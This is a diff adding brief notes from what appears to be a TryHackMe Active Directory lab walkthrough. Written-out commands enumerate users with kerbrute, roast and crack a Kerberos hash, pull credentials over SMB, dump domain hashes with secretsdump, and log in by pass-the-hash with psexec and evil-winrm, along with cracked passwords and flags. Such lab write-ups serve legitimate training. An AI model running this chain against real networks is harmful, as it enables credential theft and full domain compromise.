@@ -1,0 +1,54 @@
+date:27/mar/2021
+time:09:14
+
+./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.119.5 user
+
+2021/03/27 09:13:50 >  [+] VALID USERNAME:	 james@spookysec.local
+2021/03/27 09:14:01 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
+2021/03/27 09:14:19 >  [+] VALID USERNAME:	 James@spookysec.local
+2021/03/27 09:14:24 >  [+] VALID USERNAME:	 robin@spookysec.local
+2021/03/27 09:15:22 >  [+] VALID USERNAME:	 darkstar@spookysec.local
+2021/03/27 09:15:59 >  [+] VALID USERNAME:	 administrator@spookysec.local
+2021/03/27 09:17:09 >  [+] VALID USERNAME:	 backup@spookysec.local
+2021/03/27 09:17:41 >  [+] VALID USERNAME:	 paradox@spookysec.local
+2021/03/27 09:21:08 >  [+] VALID USERNAME:	 JAMES@spookysec.local
+2021/03/27 09:22:13 >  [+] VALID USERNAME:	 Robin@spookysec.local
+2021/03/27 09:28:21 >  [+] VALID USERNAME:	 Administrator@spookysec.local
+
+GetNPUsers.py -no-pass -dc-ip 10.10.61.234  spookysec.local/svc-admin 
+stored in hash.txt
+
+hashcat -m 18200 -a 0 hash.txt passwords --force
+management2005
+
+credentials:-
+svc-admin:management2005
+
+smbclient -L \\\\10.10.61.234\\ -U svc-admin
+smbclient  \\\\10.10.61.234\\backup -U svc-admin
+smb: \> get backup_credentials.txt
+echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
+ans:-backup@spookysec.local:backup2517860 
+
+secretsdump.py spookysec.local/backup:'backup2517860'@10.10.61.234 -just-dc
+
+psexec.py Administrator@10.10.61.234 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc
+boom!!!!!!!!!!!!!!!!! 
+
+sudo gem install evil-winrm
+evil-winrm -i 10.10.61.234 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+svc-admin flag 
+*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
+TryHackMe{K3rb3r0s_Pr3_4uth}
+
+
+backup flag
+*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
+TryHackMe{B4ckM3UpSc0tty!}
+
+
+Administrator flag
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> more root.txt
+TryHackMe{4ctiveD1rectoryM4st3r}
+
